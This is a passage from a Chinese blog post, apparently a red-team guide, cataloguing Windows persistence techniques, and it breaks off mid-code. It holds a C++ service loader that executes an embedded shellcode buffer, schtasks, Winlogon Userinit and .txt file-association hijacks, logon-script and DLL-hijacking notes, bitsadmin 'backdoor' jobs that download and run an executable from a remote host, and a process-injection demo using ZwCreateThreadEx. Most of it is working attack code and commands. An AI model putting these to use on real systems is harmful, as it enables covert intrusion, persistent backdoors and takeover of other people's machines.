class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00...............................................\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78&quot;</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log1.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sddd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sddd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这其实也是psexec的原理:建立连接后创建服务反弹shell</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>删除服务:</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">sc <span class="hljs-keyword">delete</span> <span class="hljs-string">&quot;SD&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x04-系统计划任务后门"><a href="#0x04-系统计划任务后门" class="headerlink" title="0x04 系统计划任务后门"></a>0x04 系统计划任务后门</h1><p>Windows实现定时任务主要有schtasks与at二种方式:</p>
+<p>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p>
+<p>每五分钟执行一次</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> minute <span class="hljs-string">/mo</span> 5   <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;sd&quot;</span> <span class="hljs-string">/tr</span> C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/13.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x05-DLL劫持"><a href="#0x05-DLL劫持" class="headerlink" title="0x05 DLL劫持"></a>0x05 DLL劫持</h1><p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
+<ol>
+<li>程序所在⽬录。</li>
+<li>加载 DLL 时所在的当前⽬录。</li>
+<li>系统⽬录即 SYSTEM32 ⽬录。</li>
+<li>16位系统⽬录即 SYSTEM ⽬录。</li>
+<li>Windows⽬录。</li>
+<li>PATH环境变量中列出的⽬录</li>
+</ol>
+<p>dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p>
+<p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\S</span>essionManager<span class="hljs-symbol">\E</span>xcludeFromKnownDlls<br></code></pre></td></tr></table></figure>
+
+<p>关于dll劫持的文章有很多,也需要去挖掘。</p>
+<h1 id="0x06-Winlogon用户登录初始化"><a href="#0x06-Winlogon用户登录初始化" class="headerlink" title="0x06 Winlogon用户登录初始化"></a>0x06 Winlogon用户登录初始化</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/punished/p/14715771.html">https://www.cnblogs.com/punished/p/14715771.html</a>)</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKLM<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon\<br>HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon\<br></code></pre></td></tr></table></figure>
+<p>对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。</p>
+<p>命令行:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg delete &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; /v Userinit /f<br>reg add &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe,&quot; /f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/14.png" srcset="/img/loading.gif" lazyload></p>
+<p> 可以powershell一句话更改</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">Set-ItemProperty   &quot;HKLM:<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>INDOWS NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; -name   Userinit -value &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\u</span>serinit.exe,C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x07-Logon-Scripts后门"><a href="#0x07-Logon-Scripts后门" class="headerlink" title="0x07 Logon Scripts后门"></a>0x07 Logon Scripts后门</h1><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
+<p>注册表位置:</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_CURRENT_USER<span class="hljs-string">\Environment</span><br></code></pre></td></tr></table></figure>
+
+<p>增加键值对</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/15.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/16.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x08-文件关联"><a href="#0x08-文件关联" class="headerlink" title="0x08 文件关联"></a>0x08 文件关联</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的”打开方式”进行关联选择。</p>
+<p>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/17.png" srcset="/img/loading.gif" lazyload></p>
+<p> 用ftype命令显示或修改用在文件扩展名关联中的文件类型。</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</p>
+<p>修改注册表（管理员权限）：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKCR<span class="hljs-symbol">\t</span>xtfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand&quot; /ve /t REG_EXPAND_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe <span class="hljs-variable">%1&quot; /f</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/19.png" srcset="/img/loading.gif" lazyload></p>
+<p> 再打开txt文件打开的是cmd</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/20.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h1><p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p>
+<p>window7以上自带</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/21.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.\bitsadmin.exe <span class="hljs-regexp">/transfer backdoor /</span>download <span class="hljs-regexp">/priority high &quot;http:/</span><span class="hljs-regexp">/192.168.1.106/</span>CM.EXE<span class="hljs-string">&quot; C:\1.exe</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/22.png" srcset="/img/loading.gif" lazyload></p>
+<p> 将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。</p>
+<ol>
+<li>在创建参数需要作业的名称</li>
+<li>该addfile需要文件的远程位置和本地路径</li>
+<li>该SetNotifyCmdLine将执行的命令</li>
+<li>所述SetMinRetryDelay定义时间回调（秒）</li>
+<li>该简历参数将运行位工作。</li>
+</ol>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> backdoor<br>bitsadmin <span class="hljs-string">/addfile</span> backdoor <span class="hljs-string">&quot;http://192.168.1.106/CM.EXE&quot;</span>  <span class="hljs-string">&quot;C:\1.exe&quot;</span><br>bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> backdoorC:\1.exe NULbitsadmin <span class="hljs-string">/SetMinRetryDelay</span> <span class="hljs-string">&quot;backdoor&quot;</span> 60 bitsadmin <span class="hljs-string">/resume</span> backdoor<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里只是随便找了个exe测试,如果是c2的马的化可以直接上线</p>
+<h1 id="0x10-进程注入"><a href="#0x10-进程注入" class="headerlink" title="0x10 进程注入"></a>0x10 进程注入</h1><p>之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现</p>
+<p>如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa</p>
+<p>记一次实战中的注入,这里是我自己写的小工具</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/24.png" srcset="/img/loading.gif" lazyload></p>
+<p>关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程</p>
+<p>同样还有shellcode注入</p>
+<p>一个demo</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD <span class="hljs-title">CeatRemoThread</span><span class="hljs-params">(DWORD pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf);<br>    <span class="hljs-comment">//混淆</span><br>    <span class="hljs-keyword">char</span>* newBuf;<br><br>    <span class="hljs-built_in">decrypt</span>(buf, shellcode_size, (LPVOID*)&amp;newBuf);<br><br>    HANDLE hHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, pid);<br>    <span class="hljs-keyword">if</span> (hHandle == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;openprocessError&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newBuf);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    LPVOID Memory = <span class="hljs-built_in">VirtualAllocEx</span>(hHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(newBuf) + <span class="hljs-number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br><br>    SIZE_T dwSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">WriteProcessMemory</span>(hHandle, Memory, newBuf, shellcode_size / <span class="hljs-number">3</span>, &amp;dwSize);<br>    <span class="hljs-comment">//Sleep(3000);</span><br>    <span class="hljs-built_in">VirtualProtectEx</span>(hHandle, Memory, shellcode_size / <span class="hljs-number">3</span>, PAGE_EXECUTE, &amp;dwOldProtect);<br><br><br>    HMODULE hNtdll = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] LoadNTdll Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Load ntdll.dll Successfully!\n&quot;</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">        ULONG CreateThreadFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID pUnkown</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">        BOOL CreateSuspended,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD 